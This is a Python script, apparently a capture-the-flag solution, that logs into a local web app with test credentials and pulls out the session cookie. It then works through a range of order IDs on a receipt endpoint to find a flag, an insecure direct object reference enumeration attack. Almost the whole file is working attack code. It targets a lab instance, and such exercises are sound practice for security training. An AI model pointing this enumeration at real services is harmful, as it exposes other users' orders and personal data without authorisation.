import requests
import re
from http.cookies import SimpleCookie

# Target base URL
BASE_URL = "http://127.0.0.1:32780"

# Initialize session
session = requests.Session()

print("[*] Authenticating with manual cookie extraction...")

# Step 1: Username
response1 = session.post(
    f"{BASE_URL}/",
    data={"username": "test"},
    allow_redirects=False
)

# Step 2: Password
response2 = session.post(
    f"{BASE_URL}/password/test",
    data={
        "username": "test",
        "user_id": "10032",
        "password": "test"
    },
    allow_redirects=False
)

# Extract session cookie manually
set_cookie_header = response2.headers.get('Set-Cookie', '')
print(f"[+] Set-Cookie header: {set_cookie_header}")

# Parse the session cookie
if 'session=' in set_cookie_header:
    # Extract just the session value
    session_value = set_cookie_header.split('session=')[1].split(';')[0]
    print(f"[+] Extracted session value: {session_value}")
    
    # Set the cookie manually
    session.cookies.set('session', session_value, domain='127.0.0.1', path='/')
    print(f"[+] Session cookies now: {dict(session.cookies)}")

print("\n[*] Testing authenticated access...")
test_response = session.get(f"{BASE_URL}/order/300000/receipt", allow_redirects=False)
print(f"[+] Status: {test_response.status_code}")
print(f"[+] Content length: {len(test_response.text)}B")

if test_response.status_code == 200:
    print("[+] Authentication successful!")
    print(f"[+] Response: {test_response.text[:500]}")
elif test_response.status_code == 302:
    print(f"[-] Still redirecting to: {test_response.headers.get('Location')}")

# Now fuzz with authenticated session
print("\n[*] Starting order_id fuzzing with authenticated session...")
print("[*] Range: 300000-300500 (501 IDs)\n")

valid_orders = []
flag_found = False

for order_id in range(300000, 300501):
    response = session.get(
        f"{BASE_URL}/order/{order_id}/receipt",
        allow_redirects=False
    )
    
    # Check for FLAG pattern
    flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
    
    if flag_match:
        flag_value = flag_match.group(0)
        print(f"\n{'='*80}")
        print(f"[!!!] FLAG FOUND at order_id={order_id}")
        print(f"[!!!] FLAG: {flag_value}")
        print(f"{'='*80}\n")
        print(f"Full response:")
        print(response.text)
        flag_found = True
        valid_orders.append(order_id)
        break
    
    # Check for valid orders (200 status, not redirected)
    if response.status_code == 200:
        valid_orders.append(order_id)
        print(f"[+] Valid order: {order_id} | Length: {len(response.text)}B")
        # Show preview
        preview = response.text[:150].replace('\n', ' ')
        print(f"    {preview}...")
    
    # Progress every 50
    if (order_id - 300000 + 1) % 50 == 0:
        print(f"[*] Progress: {order_id - 300000 + 1}/501 | Valid orders: {len(valid_orders)}")

print(f"\n[*] Summary:")
print(f"    Valid orders found: {len(valid_orders)}")
if valid_orders:
    print(f"    Order IDs: {valid_orders}")
if flag_found:
    print(f"    FLAG: {flag_value}")
else:
    print(f"    No FLAG found in range")

